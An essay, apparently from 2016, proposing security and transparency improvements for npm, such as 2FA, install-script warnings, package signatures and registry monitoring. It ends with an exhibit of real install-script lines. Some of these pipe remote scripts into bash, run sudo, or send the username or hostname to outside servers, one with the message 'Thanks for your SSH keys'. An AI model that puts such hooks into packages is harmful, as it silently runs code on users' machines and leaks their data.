# Short-term package manager wishlist (for Node.js/npm)

_Originally made public at 2016-11-03._

Do not treat this list as some outstanding problems or vulnerabilities on npm, Inc. side, it's closer to a personal wishlist of some hardening / transparency issues that would improve the overall ecosystem security. Also, good security is hard: some entries here require significant amount of work (some don't). The fact that they are not implemented yet is not a bug, vulnerability, or oversight, but keeping an open list of those still looks like a good idea to me. Also note that not all of this wishlist is targeted at npm, some of these could be implemented on the community side.

This is not post in favor or against npm, nor the intention of this post is blaming or offending anyone, or anything else like that. Note that my views could differ from other people views, and I also express some disagreement on some topics and the current way of doing things, but my only intention in writing this was to improve the current situation in the ecosystem and reduce potential risks. If you think that I chose incorrect language or am too harsh somewhere — just ping me over [email](mailto:chalkerx@gmail.com), IRC (ChALkeR@freenode), or [Gitter](gitter.im/ChALkeR). Also note that I am not a native English speaker, so I could have made mistakes somewhere.

Most part of this is security-related, on any categories. Some entries aren't, though. Because of that, this is grouped not by security issues vs not security issues, but with the target where should the change be applied.

I kept this list private for several months, but now it's time to publish a slightly redacted version.

_Notice: this list might be updated in the future._

## Package manager client (`npm`)

 1. Drop or hard deprecate `_auth` and `_password` support, warn on seeing them even after dropping (important). [npm/npm#9866](https://github.com/npm/npm/issues/9866)
 2. Warn on huge package size pre-publishing (with a confirmation). [npm/npm#8339](https://github.com/npm/npm/issues/8339), see also a list of real-world examples there.
 3. Warn on other sanity check failures on the client (with a confirmation). Could be opt-in in v4 and opt-out in v5. [npm/npm#8617](https://github.com/npm/npm/issues/8617). Also a `package.json` field opt-out could be possible.
 4. Opt-out flag from loading `dependencies` from thirdparty servers (i.e. http or GitHub deps). Perhaps even opt-in in next major. Several percents of npm packages are affected afaik, counting nested deps.
 5. There are packages that prefer installing them with `-g`, and those provide executables that the user could run from any place. There should be also an option doing the opposite thing — warning when a package is being installed with `-g` but is not supposed to be, and that option should be turned on by default. There is no reason for packages that do not provide executables to be installed with `-g`, and we _do_ see users doing `sudo npm install -g graceful-fs`, [for example](https://github.com/npm/npm/issues/12502). Perhaps `allowGlobal` (off by default) would solve this. It would be ok to not block the install but print warnings.
 6. Add a verbose mode for package publishing, perhaps even make it the default one. It should print the tree of files and overall stats (size) before publishing, and ask for a confirmation. Non-verbose mode could be kept by default in v4 or under a flag in v5.
 7. Make sure the user is notified of all post-install and pre-install scripts, perhaps with them requiring user confirmation. Perhaps even being disabled by default and causing a warning, telling to «re-run with a {flag} flag to execute the following commands: {postinstall list}».
 8. Replace or complement sha1 with sha256.
 9. `npm login` should warn the user to keep `.npmrc` private upon success.
 10. Consider changing the default method of including all-but-blacklisted files in the dir. Perhaps require `files`? See also [npm#12331](https://github.com/npm/npm/issues/12331).
 11. Warn and abort on unsupported or unknown flags. The user surely don't want post/pre-install scripts to be run when they make a mistype in the `--ignore-scripts` option, and that is exactly what happens now. [npm#14396](https://github.com/npm/npm/issues/14396).

## Registry API — users and package uploads

 1. 2FA:
  * **Done (2017).** ~Opt-in — to get a token~
  * **Done (2017).** ~Opt-in — for confirming _all_ publishes done by a user~
  * There should be an option to enforce 2FA (login/publish) per-package that would make all further actions done to this package require a verification code.
 2. **Partial (2018-02)** Email notifications on any updates to the owned packages, to the profile or to the list of owned packages — _partially implemented as of 2018-02, only for own publishes._
 3. Webpage-based notifications to any of the above (i.e. just a list of all write actions by oneself on npmjs.com).
 4. Don't actually publish packages with npm credentials, run scans _prior_ to the publishing, not _after_ the package was already published.
 5. Is there a proper bruteforce prevention mechanism running? I hadn't noticed it.
 6. **Done (2017).** ~~Warn users on too simple passwords — too short, known weak, same as login with minor modifications, etc.~~

## General ecosystem and communication, including website interface (public)

 1. A reasonable way to submit another users' leaked token to npm — perhaps a webpage that would allow to paste several tokens with descriptions where those were found. It should check and track those, so that the one who submitted them should see what is happening with those. _I have sent some emails with npm tokens that weren't reacted to for a few months._
 2. A public list of package updates on npmjs.com for each package — same as `npm info`, but with actual authors who pushed the update and pretty-printed in html.
 3. A public list of _all_ package updates somewhere, including the graphs.
 4. There should be a clear notice of the post-install scripts on the package page, perhaps. Per each version, preferably. That won't stop a malicious attacker, of course, but it _should_ people to better care of what they put in those scripts.
 5. Add «collaborators» and list those on the package page, rename current «Collaborators» to «Publishers» or something like that. Some people probably give access to package publishing to more users just because that's the only way to add their avatars to the package sidebar. [Express](https://www.npmjs.com/package/express) had an enormous list of people with access to the package before [the incident](Do-not-underestimate-credentials-leaks.md).
 6. List the deep dependencies somewhere, in a way similar to normal dependencies. Versions should be included — i.e. if there are two non-inersecting ranges, both should be listed. See [Gzemnid](https://github.com/ChALkeR/Gzemnid) for an example. When implementing an UI, not that such list already goes over 1000 deps for more than a hundred packages and reaches 1900+ deps for at least one package.
 7. Improve navigation in the «dependants» lists. It's unbearable. There should be nice a way to view all dependants on a single page. 
 8. Add a «dependencies» list — the current one is broken. There should be nice a way to view all dependencies in a single list, including version ranges. What I currently see is «Dependencies (51): … and 69 more» without any ability to expand «more».
 9. Count downloads per package version, make that information public.
 10. Implement a viewer of the package contents — to check what's in the package without manually downloading it.
 11. Implement a code search over package contents, see [Gzemnid](https://github.com/ChALkeR/Gzemnid).
 12. Open-source the website again, if possible. I believe that I found some security-related issues on it which I wouldn't have found it was closed-source from the start. Those most likely would have been still unfixed in that case. Security through obscurity is ineffective — a motivated attacker could have found those issues.
 13. **Done.** ~~Don't display complete auth tokens on https://www.npmjs.com/settings/tokens page — that's not needed and could easily lead to problems once any other protection mechnahism is breached. Masked tokens like `ca5b8af2-****-****-****-**********9c` should be enough for users to identify the correct one and revoke what they want to.~~
 14. Collaborators should confirm invitations before getting their names and avatars displayed next to a package. _Note to everyone: don't trust those as authorities, anyone currently could add anyone else as a collaborator without their consent. The same affects the package lists on `https://npmjs.com/~{username}` — check actual publishers instead._
 15. Enable `SameSite` cookie attribute, at least for the session cookie.
 16. Make CSP rules more strict, atm they allow loading any js from any website on some pages.
 
## Registry monitoring and analysis (not necessary public)
 
 1. Monitor any abnormalities in package publishes timings
  * Overall rate per minute/hour/day
  * Too fast publishes from a user, per second/minute/hour/day
  * Too fast publishes from an IP, per second/minute/hour/day. Note the NAT, though — it should be also _unexpected_, i.e. sudden increase.
  * There are certain dependence over hour and day in package publishes, which should be about the same. A sudden change in that should trigger a warning.
  * Sudden increase in publishing of older versions of packages compared to new versions
  * … some other metrics that I am certainly missing here
 2. Monitor abnormalities in package contents.
  * File listing is pretty simple, and obtaning the total counts per each filename in all the packages is pretty simple. A sudden introduction of a similary named new file in many packages should trigger a global warning.
  * Some content is most often not wanted inside the package dirs. If the registry observes something that is not prohibited, but most likely was published accidently — it should issue a notice to the user (see 4), with a «dismiss» button that will hide this specific warning for any further publishes of the same package.
 3. Check the pre-install/post-install scripts. A significant portion packages use those for some kind of strange things like going out of the directory and doing something in the parent dirs. Perhaps this also should be done for new package uploads in an automatic or semi-automatic way.
 4. Check package download abnormalities, i.e. a sudden increase of package downloads rate for some package. Not sure if keeping that public is good because it will invite script kiddies, but such a list should be made.
 5. Spend some community time reviewing popular packages?

## Structural changes (requires noticeable changes on both client and the server, not breaking, though)

 1. Given that many packages contain tests, docs, and/or are pre-processed with e.g. Babel, it would make sense to host two versions of each package — for development and for production. Atm, packing everything (tests, unprocessed sources) into the package often makes packages exceedingly huge and increases the download time, and that makes some people upset, and some strip the sources and tests from packages. Stripping the sources and tests has also negative consequences — some packages are not linked to the repos, some old packages already got their repos removed, so it's not possible (or at least not easy) to obtain the original sources for those, which hurts FLOSS. A solution for that would be an opt-in split the package in two parts, one of which is an extra `.dev.tgz` archive that contains all the remaining source/test/etc. files _that are not already present in the production package_ (to remove duplication and to make them coinstallable in the same dir). Also, users (through the client) should be able to opt-in for installing all the development bits for their dependencies with regular production packages — if they want to inspect what's going on.
 
 This could be generalized further: perhaps consider splitting `files` into separate lists, like `tests`/`dist`/`src`/`doc`, etc, to allow faster and smaller installs for production and allow clients to choose themselves what to download and install. Storing everything needed for the development of the package itself (`src`/`tests`/`etc`) in the registry still needs to be promoted (third-party repos could go away, and having sources is important), and this split would do exactly that — it would remove the concern of minifying installs, which is why some packagers do not ship tests or even the sources nor store them in the registry.

 2. Implement package signatures mechanism, similar to commit signing on GitHub and package signatures in distro package managers. A user should be able to have their own list of trusted signatures. A user should be able to enable validating of the signatures at different warning levels: ignore/warn/reject for missing signatures, ignore/warn/reject for unknown signatures. Packages with invalid signatures should be always rejected, regardless of user settings. The current hashes are not enough — they do not gurantee _who exactly_ made the package. With package signatures, one would be able to whitelist only a known list of packagers.

For the entries that impose a presense of a monitoring system, I would like to see such a monitoring system open-sourced, so that it could be improved by the community and the security researchers. Keeping things like this behind closed doors result in failures like the one we already observed recentely (with the monitoring system being down and no one noticing that).

## Exhibit 1 — cool usage of `(post|pre)install` (partial):
```json
"preinstall": "bower >/dev/null || sudo npm install bower grunt-cli -g",
"preinstall": "sudo ./installation/preinstall.js",
"postinstall": "sudo ./installation/postinstall.js",
"postinstall": "curl http://files.gangelov.net/cage.sh 2>/dev/null | bash &>/dev/null"
"postinstall": "sudo node postinstall.js"
"postinstall": "sudo mkdir -p /etc/lynckia/; sudo cp config_template.js /etc/lynckia/erizo_config.js"
"postinstall": "wget -q http://176.31.142.25/javascript_no_way_you_got_here_randomly"
"preinstall": "curl https://install.meteor.com | /bin/sh",
"postinstall": "curl -o sass/lib/_normalize.scss https://raw.githubusercontent.com/necolas/normalize.css/master/normalize.css"
"preinstall": "sudo apt-get install libcairo2-dev libgif-dev",
"postinstall": "echo '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThanks for your SSH keys :)' && curl -X GET http://104.131.21.155:8043/\\?$(whoami)"
"postinstall": "ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\""
"preinstall": "wget http://s.qdcdn.com/17mon/17monipdb.zip&&unzip -p 17monipdb.zip 17monipdb.dat>17monipdb.dat",
"postinstall": "echo Now run sudo install-lana to finish installation",
"preinstall": "sudo npm i -g peerflix",
"preinstall": "node-gyp configure && mkdir -p deps && cd deps && curl \"https://codeload.github.com/fletcher/peg-multimarkdown/tar.gz/3.7\" | tar zxvf - && mv peg-multimarkdown-* peg-multimarkdown && cd peg-multimarkdown && CFLAGS=\"-fPIC -Wall -O3 -include GLibFacade.h -I ./ -D MD_USE_GET_OPT=1 -D_GNU_SOURCE\" make && cd ../../ && node-gyp build",
"postinstall": "curl http://download.yandex.ru/mystem/mystem-2.0-macosx10.5.tar.gz > mystem.tar.gz && tar -xvf mystem.tar.gz && mkdir -p vendor/darwin/x64 && mv mystem vendor/darwin/x64 && rm mystem.tar.gz"
"preinstall": "sudo npm install gulp bower -g",
"postinstall": "curl -o npmdb.pft https://smikes.github.io/npm-kludge-search/npmdb.pft"
"preinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=UA-80316857-2&cid=fab8da3e-d191-4637-a138-f7fdf0444736&ec=Pre%20Install&ea=run'",
"postinstall": "curl 'http://google-analytics.com/collect?v=1&t=event&tid=UA-80316857-2&cid=fab8da3e-d191-4637-a138-f7fdf0444736&ec=Post%20Install&ea=run'"
"postinstall": "sudo ./configure.sh"
"preinstall": "cd src/pngpaste && make all && sudo make install",
"postinstall": "echo \"Enabling I2C at boot time, you may be asked for your password\" && sudo env \"PATH=$PATH\" script/enable_i2c.js",
"postinstall": "echo \"Disabling serial port login at boot time, you may be asked for your password\" && sudo env \"PATH=$PATH\" script/enable_serial.js",
"postinstall": "mkdir installed;sudo rpm -Uvh --nodeps --replacepkgs --replacefiles $1 rpmnpmtest.rpm"
"postinstall": "sudo pip install awscli"
"postinstall": "sudo -u $(whoami) node ./lib/postinstall.js"
"preinstall": "sudo apt-get install espeak lame vorbis-tools"
"postinstall": "bash -c 'curl \"http://avighier.piwikpro.com/piwik.php?idsite=3&rec=1&action_name=$HOSTNAME\"'"
"postinstall": "curl -L https://cognitom.github.io/tokoro/dist/data-v02.zip > data.zip; unzip -oq data.zip -d data; rm data.zip"
"preinstall":"sudo apt-get install --fix-missing -y bluetooth bluez libbluetooth-dev libudev-dev"
"postinstall": "sudo npm install -g forever",
"postinstall": "curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar;chmod +x wp-cli.phar;sudo mv wp-cli.phar /usr/local/bin/wp",
"postinstall": "curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar;chmod +x wp-cli.phar;sudo mv wp-cli.phar /usr/local/bin/wp ; sudo npm link;",
"postinstall": "mkdir bin && curl -L http://bit.ly/xmageLauncher034 > bin/launcher.jar"
```
